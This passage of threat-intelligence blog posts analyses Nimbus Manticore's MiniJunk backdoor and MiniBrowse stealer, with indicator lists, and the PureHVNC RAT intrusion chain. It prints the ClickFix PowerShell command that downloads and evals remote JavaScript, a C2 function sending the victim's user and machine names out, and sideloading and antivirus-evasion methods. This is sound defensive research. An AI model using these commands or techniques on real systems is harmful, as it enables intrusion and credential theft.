which we call multi-stage sideloading:\nSetup.exe\nfrom the archive. This is a legitimate Windows executable, which sideloads userenv.dll\nfrom the same archive.Setup.exe\nstarts another benign binary, a Windows Defender component called SenseSampleUploader.exe\n. This executable in turn sideloads the malware loader, xmllite.dll\n, from the archive’s directory.Setup.exe\nunder its original name, MigAutoPlay.exe\n, and the malicious userenv.dll\nthat it sideloads, to the malware working directory %AppData%\\Local\\Microsoft\\MigAutoPlay\\.\nIt creates a scheduled task to run the executable.Once the initial Setup executable runs, it sideloads the userenv.dll\nfrom the same folder. The DLL first checks the name of the executing PE module to determine the current stage of the infection chain. This way, if the DLL does not run from MigAutoPlay.exe\n(meaning the setup of the backdoor did not occur yet), it will load the Loader DLL in a special way, exploiting undocumented low-level API to hijack the DLL loading path.\nuserenv.dll\nuses low-level ntdll API calls to execute a Windows Defender binary located at C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\n. The Windows Defender executable is vulnerable to DLL hijacking due to using the relative path to xmllite.dll\n. This flaw is abused to sideload the xmllite.dll\n. However, the actor manages to sideload it from the same folder as the malicious archive as part of a unique multi-stage sideloading attack chain.\nNormally, a legitimate Windows Defender executable does not load random DLLs from folders outside the Windows DLL search order path. So, what’s happening here?\nWhen using low-level NT API calls to create a process, a call to RtlCreateProcessParameters\nis mandatory to build a process parameter struct RTL_USER_PROCESS_PARAMETERS\nwhich is then handed to RtlCreateUserProcess\n. A key field in this structure is the DllPath\nparameter, which defines the search path that the process loader uses to locate and resolve imported modules. If set, it specifies the location where the loader should search for a DLL if it is not found in the application directory.\nThe malware abuses this undocumented feature by using GetModuleHandle\nto get a path to Setup.exe\nand then provides it as a DllPath\nparameter. As setup.exe and xmllite.dll are next to each other in the malicious archive, when the dll is not found next to SenseSampleUploader.exe\n, it will be loaded from the archive directory:\nOnce the xmllite.dll\nis loaded, its actions are pretty straightforward. It creates a working folder under the path AppData\\Local\\Microsoft\\MigAutoPlay\\\n. It copies the backdoor userenv.dll\nto it, also places the legitimate executable there as MigAutoPlay.exe\n, and then adds an auto-run registry key to execute the benign executable.\nAfter persistence is completed, the malware is launched through the MigAutoPlay.exe\n, which sideloads userenv.dll\nand shows the victim a fake error pop-up about network issues blocking the lure program from running.\nIn the last year, the actor introduced a lot of changes to the backdoor, first documented by Mandiant as “Minibike.” We chose to track this sample as “MiniJunk.”\nThe userenv.dll\nbackdoor core logic starts from the DLLMain function. The backdoor first resolves many imports needed for it to function, but oddly enough, when it wants to use a function that was already resolved, it resolves it again. This behavior is unusual, but it might have been leveraged in the development cycle to identify API resolution issues. The backdoor then collects two identifiers from the infected system: the computer name and the domain name with the username.\nAlthough the sample employs a substantial amount of obfuscation (which is discussed in detail in the next section), it does not encrypt the network data. Instead, it encodes it. We saw similar samples in the past that used a simple encryption on the network data, such as XOR with a few bytes. In this case, however, it uses a simple encoding algorithm: data is collected in a wide string, then converted to bytes, and the bytes are reversed. Finally, the entire string is reversed.\nWhen the main logic starts, the backdoor checks if the running executable is called MigAutoPlay.exe\n(meaning the backdoor is running after the setup from its permanent working directory) and hooks the ExitProcess\nfunction to a function that sleeps, probably preventing fatal exits or allowing other threads to run in case of a program crash:\nAfter initialization, the backdoor starts a main thread that handles networking and the remaining logic. Analyzing the sample in this part is quite tricky: the logic is heavily branched through functions that utilize various states, for example, a large number of classes for network requests, and obfuscations in combination with library functions. However, all of this ultimately masks simple backdoor functionality.\nThe backdoor variants typically utilize multiple command and control (C2) servers in rotation for redundancy. There are several (between three to five) hardcoded C2 servers, so if one C2 goes down, the next one in the list will be used. The backdoor uses regular HTTPS requests using the Windows API. When the C2 responds, a thread is created to parse the C2 request. The C2 responds using encoded strings, similar to the initial network data. The response structure consists of a string separated by ##\n. It is parsed by the backdoor and split into a vector of strings. Most C2 commands need 3 values:\nFor example, a “read file” command looks like this:\n##[chunks size]##[read file command id]##[file path]\nAfter parsing the command, in this case, the backdoor sends the file from the specified path via several network requests, based on the chunk size provided as an argument. The backdoor supports the following commands:\nAs can be seen by the functions, these are pretty standard for a backdoor. The real complexity in the samples comes from their obfuscations which make the samples harder to analyze.\nMiniBrowse is a lightweight stealer used by Nimbus Manticore. We observed two variants, one to steal Chrome credentials and another which targets Edge. Both versions are DLL designed to be injected into browsers to steal the stored passwords.\nAfter it’s executed, MiniBrowse first collects two identifiers from the system, username and domain name, and then connects to a predefined endpoint on the C2 server sending data in JSON payload.\nWe identified a unique network communication behavior, as the C2 needs to respond with any HTTP response except for 200. If it does, the backdoor continues its execution looking for several files related to Edge login data.\nEach of those files is then exfiltrated to the C2, using a simple POST request:\nAnother method of sending those files is through connecting and sending the JSONs to a named pipe. We identified multiple MiniBrowse versions with support for this functionality.\nThe MiniJunk and MiniBrowse samples that we investigated exhibit heavy compiler‑level code obfuscation, possibly implemented via custom LLVM passes. We had to address several obfuscation techniques to facilitate analysis, including junk code insertion, control‑flow obfuscation, opaque predicates, obfuscated function calls, and encrypted strings. The attacker invested significant effort in developing these LLVM passes and continues to refine them; each “generation” of samples shows improvements over the previous one, typically introduced between campaigns. The actor appears to be targeting a substantial number of victims, and these obfuscations help the malware remain undetected while at the same time slowing down researchers trying to determine the samples’ behavior. As with most obfuscation, no single tool addresses all cases: off‑the‑shelf tools often fail unless the scheme matches a generic framework such as OLLVM – which is not the case here. This underscores the attacker’s willingness to invest in their toolset and, conversely, benefits researchers by exposing new techniques. We invested considerable effort to make the samples sufficiently “reversible” for analysis.\nThe backdoors contain compiler-level obfuscation. As a result, almost all function calls are obfuscated. The decision on what function to call is based on several arithmetic operations, which are then stored in the RAX register. Here is an example of a DLL’s primary function:\nNot only are function calls obfuscated, but there are also obfuscated branches inside functions.\nIn this next example, there is a JMP RAX instruction, but it’s not a single JMP. Depending on various conditions that are met when the code is running, the JMP can lead to two different places, just like a conditional JMP, but masked as a single JMP.\nEach string is individually encrypted with its own key. The encrypted bytes are stored in memory with the key placed at the end of each string. Each string gets its own decryption function, adding another layer of complexity. To top it off, the decryption routines are each overloaded with opaque predicates:\nWe used LLM to simplify the function mentioned above. Eventually the encryption algorithm is just string[i] ^ key[i % key_length]\n. Once we established that, we were able to automate and decrypt all strings.\nThe samples contain a bit of unused junk code:\nDistinct patterns helped us deduce that a “block” of instructions can be classified as junk code, highly repetitive in the code. Then we can exclude it in the decompile view, and continue with static analysis:\nOver the past year, MiniJunk has undergone many changes and incorporated a variety of techniques. In this section, we describe the most significant.\nIn May, Nimbus Manticore started to use the service SSL.com to sign their code. This led to a drastic decrease in detections, with many samples remaining undetectable by multiple malware engines.\nBased on the signing dates and our analysis of samples signed by this certificate, we determined that they were generated by the threat actor, masquerading as existing IT organizations in Europe.\nIn June, the actor re‑architected C2 to combine Cloudflare and Azure App Service. This improved the resiliency so execution could continue even if a provider or domain was suspended.\nLarge malware files often have lower endpoint detection, as many Antivirus engines enforce time, size, and resource limits that truncate deep unpacking, emulation, and heuristic layers on oversized inputs. Nimbus Manticore exploits this by inflating binaries with inert junk code blocks. Feature extraction and ML models frequently cap analysis to the first portion of a file, so padding pushes discriminative byte patterns past those limits, while some engines simply skip or downgrade scanning of large files to avoid false positives and performance hits. The combination of obfuscations, size, and codesigning result in lower endpoint detection. As you can see, some of the largest samples remained with zero detections on VirusTotal:\nIn addition to the operations involving the MiniJunk backdoor we described earlier in this blog, we observed a separate but closely related activity cluster. This cluster, first reported by PRODAFT, employs TTPs that broadly align with those documented above, but is distinguished by much smaller payloads and a lack of sophisticated obfuscation.\nCheck Point Harmony Email & Collaboration platform identified and blocked a spear-phishing attack against a telecommunication provider in Israel.\nAs documented in past intrusions, the attacker uses professional social media such as LinkedIn, masquerades as an HR specialist, then asks the target to move to another platform such as email.\nA malicious email sent from an Outlook account with a job application invitation:\nAs previously observed in other Nimbus Manticore campaigns, the link leads to a React-based fake recruiting login page:\nThe malware used in this operation is delivered through DLL hijacking of dxgi.dll\n:\nThe malware strings were obfuscated by using simple one-byte XOR with 0x55\n.\nThe execution started by decrypting 5 predefined C&C servers:\nservices-update-check.azurewebsites[.]net send-feedback.azurewebsites[.]net send-feedback-413.azurewebsites[.]net send-feedback-838.azurewebsites[.]net send-feedback-296.azurewebsites[.]net\nDespite overlapping infection chain steps and infrastructure, dxgi\nand MiniJunk\nimplement different command sets. At the same time, dxgi\ndoes not exhibit evasion or obfuscation techniques. All this indicates parallel activity that could be conducted by more than one actor.\ndxgi.dll\nand MiniJunk samples overlap in multiple details: they hook the exit process in a very similar way, and they both collect the username and desktop name (but the new sample also collects adapter information).\nIn terms of C2 communication, the key similarities lie in two areas: the parsing of network responses from C2 server, and the set of C2 commands.\nThe responses from C2 to MiniJunk use various separators for the data, such as ###\nor ---\n. The dxgi.dll\nbackdoor includes an additional verification of the request by hashing one of the parameters with FNV and comparing the result with a generated value. Overall, the C2 communication between these backdoors is not identical but is still quite similar.\nThe C2 commands in both versions closely resemble each other, with very similar logic and an identical order of operations within the functions themselves. While the command ID varies, the underlying code base appears to be the same.\nRegarding significant differences, for network communications, dxgi.dll\nadds a layer of encryption. In addition, the backdoor utilizes the WinHTTP API, but unlike MiniJunk which employs classes and branching on network requests, this current backdoor handles all network logic within a single function. Finally, it appears the backdoor developer didn’t bother changing the user agent, instead keeping it as is WinHTTP Example:\nThe findings above suggest dxgi.dll\nshares a common code base with MiniJunk versions. Both of the activity clusters may have access to the code base, and can modify the code as needed, adding compiler passes, and altering the logic slightly. At the same time, the programming paradigm remains similar. This is hard to notice at first, due to MiniJunk obfuscations, the different layout of the HTTP request method (classes vs non-classes), and other variations. But once the obfuscations are addressed, it becomes clear that they share the same code base.\nMiniJunk campaigns use long, concatenated health-themed subdomains of azurewebsites[.]net. Notably, the domain naming convention in this campaign is different: the unique domain pattern is [a-z]-[a-z]+-[a-z]+-[0-9]{3}.azurewebsites.net\ncombining multiple words joined by hyphen separators.\nWhile hunting for these domain naming conventions, we observed a distinct set of domains used to target Europe which featured the following sequence of malicious domains:\ntelespazio-careers[.]com\n– Lure websiteupdate-health-service[.]azurewebsites[.]net\n– First observed Azure app service domain (mentioned by PRODAFT)We were able to capture the following domain block, which we believe is unique for each sample:\ncheck-backup-service.azurewebsites[.]net check-backup-service-288.azurewebsites[.]net check-backup-service-179.azurewebsites[.]net check-backup-service-736.azurewebsites[.]net\nC2 Infrastructure based on azurewebsites allows the attacker flexibility and redundancy; if one C2 goes down, they can easily set up a new one.\nWhile Nimbus Manticore consistently targets the Middle East, especially Israel and the UAE, recent operations show increased interest in Western Europe. We found a correlation between the malware delivery websites and the targeted sectors. For example, a fake hiring portal of a telecommunication company will target an employee and organizations in this sector. Our findings point to similar targets in several key sectors: telecommunications, especially satellite providers, defense contractors, aerospace and airlines. These sectors align with the IRGC’s strategic intelligence collection efforts.\nFigure 21 – Geographic distribution of targeted organizations.\nThe deployment of Minibike samples in June suggests “business as usual”, occurring as it did against the backdrop of the twelve-day conflict between Israel and Iran. The identified samples indicate that Israel was the primary focus at that time.\nIn our research, we uncovered the elusive operations of the Iranian threat actor known as Nimbus Manticore. Over the last year, this threat actor adopted a new set of techniques that allowed them to remain under the radar and continue operating even during the twelve-day Israeli-Iranian conflict.\nNimbus Manticore also expanded its interest in European targets, particularly in the telecommunications, defense, aerospace, satellite and airline sectors. We analyzed the evolution of the Minibike implant, which has incorporated multi-layered obfuscation and increasingly relies on legitimate cloud services to remain stealthy and difficult to detect.\nHashes:\n23c0b4f1733284934c071df2bf953a1a894bb77c84cff71d9bfcf80ce3dc4c16- malicious zip\n0b2c137ef9087cb4635e110f8e12bb0ed43b6d6e30c62d1f880db20778b73c9a - malicious zip\n6780116ec3eb7d26cf721607e14f352957a495d97d74234aade67adbdc3ed339 - malicious zip\n41d60b7090607e0d4048a3317b45ec7af637d27e5c3e6e89ea8bdcad62c15bf9 - malicious zip\n4260328c81e13a65a081be30958d94b945fea6f2a483d051c52537798b100c69 -malicious zip\na37d36ade863966fb8520ea819b1fd580bc13314fac6e73cb62f74192021dab9- malicious zip\n5d832f1da0c7e07927dcf72d6a6f011bfc7737dc34f39c561d1457af83e04e70- malicious zip\nffeacef025ef32ad092eea4761e4eec3c96d4ac46682a0ae15c9303b5c654e3e\nc22b12d8b1e21468ed5d163efbf7fee306e357053d454e1683ddc3fe14d25db5\n4da158293f93db27906e364a33e5adf8de07a97edaba052d4a9c1c3c3a7f234d\n061c28a9cf06c9f338655a520d13d9b0373ba9826a2759f989985713b5a4ba2b\nbc9f2abce42141329b2ecd0bf5d63e329a657a0d7f33ccdf78b87cf4e172fbd1\ne69c7ea1301e8d723f775ee911900fbf7caf8dcd9c85728f178f0703c4e6c5c0\ne77b7ec4ace252d37956d6a68663692e6bde90cdbbb07c1b8990bfaa311ecfb2\nb43487153219d960b585c5e3ea5bb38f6ea04ec9830cca183eb39ccc95d15793\n1b629042b5f08b7460975b5ecabc5b195fcbdf76ea50416f512a3ae7a677614a\nf8a1c69c03002222980963a5d50ab9257bc4a1f2f486c3e7912d75558432be88\n954de96c7fcc84fb062ca1e68831ae5745cf091ef5fb2cb2622edf2358e749e0\nafe679de1a84301048ce1313a057af456e7ee055519b3693654bbb7312083876\n9ec7899729aac48481272d4b305cefffa7799dcdad88d02278ee14315a0a8cc1\n3b4667af3a3e6ed905ae73683ee78d2c608a00e566ae446003da47947320097f\na4f5251c81f080d80d1f75ad4cc8f5bc751e7c6df5addcfca268d59107737bd0\ncf0c50670102e7fc6499e8d912ce1f5bd389fad5358d5cae53884593c337ac2e\n3b58fd0c0ef8a42226be4d26a64235da059986ec7f5990d5c50d47b7a6cfadcd\n7c77865f27b8f749b7df805ee76cf6e4575cbe0c4d9c29b75f8260210a802fce\nd2db5b9b554470f5e9ad26f37b6b3f4f3dae336b3deea3f189933d007c17e3d8\nb9b3ba39dbb6f4da3ed492140ffc167bde5dee005a35228ce156bed413af622d\n53ff76014f650b3180bc87a23d40dc861a005f47a6977cb2fba8907259c3cf7a\nb405ae67c4ad4704c2ae33b2cf60f5b0ccdaff65c2ec44f5913664805d446c9b\n5985bf904c546c2474cbf94d6d6b2a18a4c82a1407c23a5a5eca3cd828f03826\n0e4ff052250ade1edaab87de194e87a9afeff903695799bcbc3571918b131100\n8e7771ed1126b79c9a6a1093b2598282221cad8524c061943185272fbe58142d\nf54fccb26a6f65de0d0e09324c84e8d85e7549d4d04e0aa81e4c7b1ae2f3c0f8\n054483046c9f593114bc3ddc3613f71af6b30d2e4b7e7faec1f26e72ae6d7669\n95d246e4956ad5e6b167a3d9d939542d6d80ec7301f337e00bb109cc220432cf - Minibrowse\n9b186530f291f0e6ebc981399c956e1de3ba26b0315b945a263250c06831f281 - Minibrowse\nDomains:\nasylimed[.]azurewebsites[.]net\nclinichaven[.]azurewebsites[.]net\nhealsanctum[.]azurewebsites[.]net\nmediasylum[.]azurewebsites[.]net\ntherashelter[.]azurewebsites[.]net\narabiccountriestalent[.]com\narabiccountriestalenthr[.]azurewebsites[.]net\narabiccountriestalents[.]azurewebsites[.]net\narabiccountriestalentshr[.]azurewebsites[.]net\ntalenthumanresourcestalent[.]com\ncarebytesolutions[.]azurewebsites[.]net\nmedicoreit[.]azurewebsites[.]net\nsmartmediq[.]azurewebsites[.]net\nvitatechlink[.]azurewebsites[.]net\nbiolinksystems[.]azurewebsites[.]net\ndigicura[.]azurewebsites[.]net\nhealthcarefluent[.]com\nhivemedtech[.]azurewebsites[.]net\nneurocloudhq[.]azurewebsites[.]net\nmarsoxygen[.]azurewebsites[.]net\nnanobreathe[.]azurewebsites[.]net\nturbulencemd[.]azurewebsites[.]net\nzerogmed[.]azurewebsites[.]net\nvirgomarketingsolutions[.]com\nvirgomarketingsolutions[.]comtions[.]com\nairtravellog[.]com\nmasterflexiblecloud[.]azurewebsites[.]net\nstoragewiz[.]co[.]azurewebsites[.]net\nthecloudappbox[.]azurewebsites[.]net\narabiccountriestalent[.]azurewebsites[.]net\nfocusfusion[.]eastus[.]cloudapp[.]azure[.]com\nframeforward[.]azurewebsites[.]net\ntacticalsnap[.]eastus[.]cloudapp[.]azure[.]com\nthetacticstore[.]com\nlensvisionary[.]azurewebsites[.]net\nwellnessglowluth[.]azurewebsites[.]net\nactivehealthlab[.]azurewebsites[.]net\nehealthpsuluth[.]com\ngrownehealth[.]eastus[.]cloudapp[.]azure[.]com\nactivespiritluth[.]eastus[.]cloudapp[.]azure[.]com\ncreateformquestionshelper[.]com[.]net\ncollaboromarketing[.]com\ncloudaskquestioning[.]eastus[.]cloudapp[.]azure[.]com[.]net\ncloudaskquestionanswers[.]com[.]net\ncloudaskquestionanswers[.]azurewebsites[.]net[.]net\ncloudaskingquestions[.]eastus[.]cloudapp[.]azure[.]com[.]net\ncloudaskingquestions[.]azurewebsites[.]net[.]net\ncloudaskingquestioning[.]azurewebsites[.]net[.]net\nvitatechlinks[.]azurewebsites[.]net\nmojavemassageandwellness[.]com\nairmdsolutions[.]azurewebsites[.]net\nventilateainest[.]azurewebsites[.]net\naeroclinicit[.]azurewebsites[.]net\nexchtestcheckingapijson[.]azurewebsites[.]net\nexchtestcheckingapihealth[.]com\nexchtestchecking[.]azurewebsites[.]net\nmaydaymed[.]azurewebsites[.]net\ntraveltipspage[.]com\nsmartapptools[.]azurewebsites[.]net\ncreateformquestionshelper[.]com\ncloudaskquestioning[.]eastus[.]cloudapp[.]azure[.]com\ncloudaskquestionanswers[.]com\ncloudaskquestionanswers[.]azurewebsites[.]net\ncloudaskingquestions[.]eastus[.]cloudapp[.]azure[.]com\ncloudaskingquestioning[.]azurewebsites[.]net\nhealthbodymonitoring[.]azurewebsites[.]net\nhealthcare-azureapi[.]azurewebsites[.]net\nhealthdataanalyticsrecord[.]azurewebsites[.]net\nmedical-deepresearch[.]azurewebsites[.]net\nmedicalit-imaging[.]azurewebsites[.]net\nmentalhealth-support-portal[.]azurewebsites[.]net\npatient-azureportal[.]azurewebsites[.]net\npharmainfo[.]azurewebsites[.]net\nsymptom-recordchecker[.]azurewebsites[.]net\nsystemmedicaleducation[.]azurewebsites[.]net\nacupuncturebentonville[.]com\ncardiomedspecialists[.]azurewebsites[.]net\ndigithealthplatform[.]azurewebsites[.]net\nmedicpathsolutions[.]azurewebsites[.]net\nnextgenhealthtrack[.]azurewebsites[.]net\nsulumorbusinessservices[.]com\ntelehealthconnectpro[.]azurewebsites[.]net\ntotalcaremedcenter[.]azurewebsites[.]net\ntrustedcarehub360[.]azurewebsites[.]net\nvirtualcliniczone[.]azurewebsites[.]net\nwellnessfirstgroup[.]azurewebsites[.]net\nyourfamilymdclinic[.]azurewebsites[.]net\ndoctorconsult-app.azurewebsites[.]net\nmanagetools-platform.azurewebsites[.]net\nmsnotetask-insights.azurewebsites[.]net\nmstrakcer-tools.azurewebsites[.]net\nolemanage-dashboard.azurewebsites[.]net\noletask-tracker.azurewebsites[.]net\npatientcare-portal.azurewebsites[.]net\nSimilar activity cluster:\nrpcconnection.azurewebsites[.]net\nbacksrv66.azurewebsites[.]net\nbacksrv74.azurewebsites[.]net\ndatasheet96.azurewebsites[.]net\nmainrepo10.azurewebsites[.]net\nservices-update-check[.]azurewebsites[.]net\nsend-feedback[.]azurewebsites[.]net\nsend-feedback-413[.]azurewebsites[.]net\nsend-feedback-838[.]azurewebsites[.]net\nsend-feedback-296[.]azurewebsites[.]net\ncheck-backup-service[.]azurewebsites[.]net\ncheck-backup-service-288[.]azurewebsites[.]net\ncheck-backup-service-179[.]azurewebsites[.]net\ncheck-backup-service-736[.]azurewebsites[.]net\nboeing-careers[.]com\nrheinmetallcareer[.]org\nrheinmetallcareer[.]com\nairbus[.]global-careers[.]com\nairbus[.]careersworld[.]org\nairbus[.]usa-careers[.]com\nairbus[.]germanywork[.]org\nairbus[.]careers-portal[.]org\nrheinmetall[.]careersworld[.]org\nrheinmetall[.]careers-hub[.]org\nrheinmetall[.]theworldcareers[.]com\nrheinmetall[.]gocareers[.]org\nflydubaicareers[.]ae[.]org\nglobal-careers[.]com\ncareers-hub[.]org\ncareersworld[.]org\nusa-careers[.]com\ngermanywork[.]org\ncareers-portal[.]org\ntheworldcareers[.]com\ngocareers[.]org", "timestamp": "2025-10-21T13:35:59.065076"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "22nd September – Threat Intelligence Report", "url": "https://research.checkpoint.com/2025/22nd-september-threat-intelligence-report/", "published": "Mon, 22 Sep 2025 08:31:42 +0000", "content": "For the latest discoveries in cyber research for the week of 22nd September, please download our Threat Intelligence Bulletin.\nTOP ATTACKS AND BREACHES\nCheck Point Harmony Endpoint provides protection against this threat (RAT.Win.Venom; Loader.Win.Venom)\nVULNERABILITIES AND PATCHES\nTHREAT INTELLIGENCE REPORTS\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat (APT.Win.Turla; APT.Wins.Turla.tays; APT.Wins.Turla.ta.*; InfoStealer.Wins.Gamaredon; InfoStealer.Win.Gamaredon; APT.Win.Gamaredon)\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat (APT.Wins.MuddyWater; APT.Win.MuddyWater; APT.Wins.MuddyWater.ta.*)", "timestamp": "2025-10-21T13:35:59.657055"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "Under the Pure Curtain: From RAT to Builder to Coder", "url": "https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/", "published": "Tue, 16 Sep 2025 12:57:03 +0000", "content": "Research by: Antonis Terefos (@Tera0017)\nThe Pure malware family is a suite of malicious tools developed and sold by the author known as PureCoder. This suite includes PureHVNC RAT (a remote administration tool and predecessor to PureRAT), PureCrypter (a malware obfuscator), PureLogs (a stealer/logger), and several other tools. The malicious software is advertised and distributed through underground forums, Telegram channels, and dedicated websites. These products are often combined to maximize their effectiveness across a wide range of malicious operations.\nWhile PureCoder is responsible for building and maintaining the malware ecosystem, cybercriminal customers primarily use these tools to conduct campaigns. In 2025, there has been a noticeable increase in the use of Pure malware products, with threat actors distributing them through various methods, including malspam, phishing websites, and the ClickFix technique.\nDuring a Check Point Incident Response (IR) engagement, our team investigated and contained an eight-day intrusion. The threat actor distributed a Rust loader, which deployed PureHVNC RAT with campaign IDs 2a\nand amazon3\n. The attacker lured the victim through fake job advertisements, allowing the attacker to execute malicious PowerShell code through the ClickFix phishing technique.\nThe RAT’s Command and Control Server (C&C) has been observed to deliver three GitHub URLs to infected victims and download the related files. These downloaded files support various commands used by PureHVNC RAT and were determined to be part of the Pure development and operation infrastructure rather than the threat actor itself. As a result, the GitHub accounts involved were attributed to the developer of Pure malware families, PureCoder.\nWhile limited information is currently available about the author of these products, analysis of the associated GitHub accounts revealed a timezone of operation set to UTC+0300\n, which corresponds to several countries, including Russia.\nClickFix is a social engineering phishing technique in which victims are presented with deceptive instructions designed to trick them into running a malicious command. In this campaign, the victim was lured to the ClickFix phishing page through fake job offers. Upon visiting the page, a PowerShell command was automatically copied to their clipboard, delivering a malicious JavaScript file.\nDuring the eight-day intrusion, the attacker used malicious JavaScript files, deployed two instances of PureHVNC RAT, established persistence on the victim’s system, and finally executed the Sliver Command and Control (C2) framework.\nDuring the first moments of the initial access, we observe the majority of interaction from the threat actor dropping JavaScript files and the first version of PureHVNC RAT.\nThe victim was lured through fake job offers, and upon visiting the malicious ClickFix website, a PowerShell command was automatically copied to their clipboard.\nThe page instructed the user to paste and execute the command. If executed, the command downloaded and ran a malicious JavaScript file, initiating the infection chain.\nCopied PowerShell command:\npowershell -c \"$j=$env:TEMP+'\\a.js';sc $j 'a=new ActiveXObject(\\\"MSXML2.XMLHTTP\\\");a.open(\\\"GET\\\",\\\"63381ba/kcilc.ellrafdlucolc//:sptth\\\".split(\\\"\\\").reverse().join(\\\"\\\"),0);a.send();eval(a.responseText);';wscript $j\" Prеss Entеr\nThe command and control server responded with malicious JavaScript code, which created a malicious LNK file in the Startup Folder and granted itself persistence to the machine. The malicious JavaScript file is obfuscated, and each day, it contacts a different command and control server and waits for further instructions.\nfunction getURL() { var C2_domain_list = ['stathub[.]quest', 'stategiq[.]quest', 'mktblend[.]monster', 'dsgnfwd[.]xyz', 'dndhub[.]xyz']; var current_datetime = new Date().getTime(); var no_days = getDaysDiff(0, current_datetime); return 'https://' + getListElement(C2_domain_list, no_days) + '/Y/?t=' + current_datetime + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime); }\nThe JavaScript delivers the first version of PureHVNC RAT with command and control 54[.]197.141.245\nand campaign ID 2a\n.\nDuring the second day of the infection, the threat actor deployed a newer version of PureHVNC RAT packed with a Rust Loader and Inno Setup, an open-source installation builder for Windows applications.\nThis Rust Loader that deploys PureHVNC RAT is dropped in %APPDATA%\\Microsoft\\SystemCertificates\\9TwinAPIInterop.pfx\nand contains no differences with the first version, the only change appears to be the campaign ID amazon3\n.\nPureHVNC RAT Configuration:\n{ \"C&C\": \"54.197.141.245\", \"ports\": [443, 10443], \"certificate\": \"MIIE4jCCAsqgAwIBAgIQAPKOllxpzWEf7Cig2iwQUTANBgkqhkiG9w0BAQ0FADASMRAwDgYDVQQDDAdXd2ZwaHZiMCAXDTI0MDkxNTEyNDUwN1oYDzk5OTkxMjMxMjM1OTU5WjASMRAwDgYDVQQDDAdXd2ZwaHZiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3Qm+O4ZX8e7qnzb7AcS+MKuMmNan06HgF1tV3zC92tiL/QylCy3TfZ1GQmut+cOfuZby9uYAyMF74uxtwpFpr6pzL4ps3HxpuxBrvAcRsUKVShpQzGOTMwlJWJj7nDX1Tn/PIr9g55C7jTF/k93grdGN38EAYQSd75gxhZ7sddCZFuBy6Bdt21URknipN9N3y/dlDO+qBZmbVhGGEqZ1HrVD2RpmKKEO6OZu4XJHLrn1EsjgxyM0ifb7P38bR/cDB2PxzOqGRZ/Snhg5Bw/uG82+twYkp6CxVRH59yamlHp9qRF4vRFLk08xZ0+lRkQV4BrEWbA60omIp3XDdnMOPFZnqHUMTBTZ871LE782VF34xM5QdIA2r6QjqNyKSymb/lMcLJEhlJ+DEf05Y20lE9nJTn/ioMKO/ilszJOhu8NS43g+torPCEOvDldBfxtgcp4w+SXXLfUi3+p/326JXghRpqZUQ99VaH/ucT4rP9CcSjIqlCymPuAhOZmRDyMAcWuzsz/1STgZ8fxP0DVprdpTLvN9n+esMPYHRECUlaZLdn9x9AmZARbMatOdAzH8LgQTG02ecVS/pEugUVg7Ipxn6pWqjK+NSFNr1kxCYI5UqZK50CdINoKM8+frA7gAl3ohnY4bRK6bFioaCCcCZJF7FaJJh+EDs/CQ6KcLpnkCAwEAAaMyMDAwHQYDVR0OBBYEFB9jTlNea5ZsJd7ClDh/cepkFXZZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQENBQADggIBAH3nFnvuPEufM3BwPNfhgs5RkPPXk2pG9cTznxER3h37kR3jguEnq2wL7yYA2D30XA8tJv7+CPZ/IrtSC0OSyEmw8a5FoHtno22e5Dtq81FY4c8kFTS0p39mtAEtitAGehMyE6K3X0LgvNaxWwbdL9rcko62msxqKRw3fxaFjTNK+tl5H6T8jXH5VMqEd0eiiK5ySanLkiy+CfYJnyqBoICYW4r1W/o65ibgxzPoOzcbod4UG9O6YwDqMDN8JlQDQTl7gZLitCRcaBZQynINF2yZwZYirdWqK0X3fhQLluoZ9zXhc5rb3UM5+QvP9p/ZaUOIZ0m18vjVcnz6Zo9N60K93u5Z/IzBcd8gM1Wp3dtDruekbjdXs8b+txMDFSy56ZPBFLJhWO4xpGt172ZMp6Du9sMAWDaDTfPvZWprE5WjCk4fltMQU0DGbPmP1il3XLtqVvPiLvuAccrbL9wkvlvDKgjqUpYjXsdFOT5unXiYc1eEDW4HIWNJcIw2J4oz8I2AlwQ+exVTEArQc8G3fNbMsvZD7CtSVJKqZLSkAfoki3Zrs/fIFTGGNzQ/Vbb01K7k7s2mAQ4Mr1JjNh/ZwlTdubKZp+jbARrhDvvdPISupSo0KDKBjwkY2tcGw/aTsYKdNywDn8VqIvLjHhDKG4vMm7FYoLMdEWIXNyvP1oJ2\", \"campaign_id\": \"amazon3\", \"install_path\": \"APPDATA\", \"mutex\": \"aa05be285061\" }\nAfter mostly staying inactive for more than six days, possibly to verify that the infected machine is a real target rather than a sandbox environment, the threat actor delivered a Sliver implant with C&C hxxps://jq-scripts.global.ssl[.]fastly[.]net\n. Sliver then delivered and executed a PowerShell Script that requested the user’s password in a prompt and stored the credentials at %ProgramData%/<domain>_<username>_cred.txt\n.\nThe malicious loader is a DLL file developed in Rust programming language and is executed using LOLBin regsvr32. The malicious functionality lies in the function exports DllRegisterServer\nand DllUnregisterServer\n, which contains the same piece of code.\nThe malware contains encrypted strings that are decrypted on demand using the ChaCha20-Poly1305 algorithm. The decryption key is generated by the XOR of two hardcoded values embedded in the binary:\nValue 1: 4a01d45563d802fee5593a21f1b216aeed83c4dff50fa6a31391ff73feb29dbd Value 2: bf83184822bf184536b50dff4758edd638b59cb82a06ee019b62b0bce33d07b5 Chacha20-Poly1305 Key: f582cc1d41671abbd3ec37deb6eafb78d5365867df0948a288f34fcf1d8f9a08\nThe first anti-analysis techniques monitor the running processes and try to identify various processes related to antivirus and security software, debuggers, reverse engineering tools and monitoring tools. The malware detected antivirus processes from Bitdefender, ESET, Kaspersky, Ad-Aware, and 360 Total Security.\nBlacklisted processes:\n\"bdservicehost.exe\", \"bdredline.exe\", \"aylaunch.exe\", \"egui.exe\", \"360Safe.exe\", \"zhudongfangyu.exe\", \"HipsDaemon.exe\", \"ekrn.exe\", \"eguiProxy.exe\", \"avp32.exe\", \"avpcc.exe\", \"avpm.exe\", \"avpdos32.exe\", \"avp.exe\", \"adawareservice.exe\", 